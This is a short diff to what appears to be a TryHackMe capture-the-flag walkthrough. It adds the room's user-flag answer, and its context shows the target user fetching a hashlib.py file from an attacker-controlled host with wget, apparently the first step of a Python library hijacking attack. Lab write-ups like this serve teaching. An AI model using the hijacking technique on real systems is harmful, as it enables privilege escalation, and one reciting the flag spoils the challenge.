@@ -156,6 +156,12 @@ hazel@ip-xx-xx-xxx-xx:~$ cat user.txt
 
 ![image](https://github.com/user-attachments/assets/ee75dbf0-d751-4a19-96b5-860ba8c10d1a)
 
+<br>
+
+> 1.2. <em>What is the user flag?</em> Hint : <em>Weak password</em><br><a id='1.2'></a>
+>> <strong><code>THM{PytH0n_LiBr@RY_H1j@acKIn6}</code></strong><br>
+<p></p>
+
 ```bash
 hazel@ip-xx-xx-xxx-xx:/tmp$ wget http://AttackIP:8000/hashlib.py
 ...
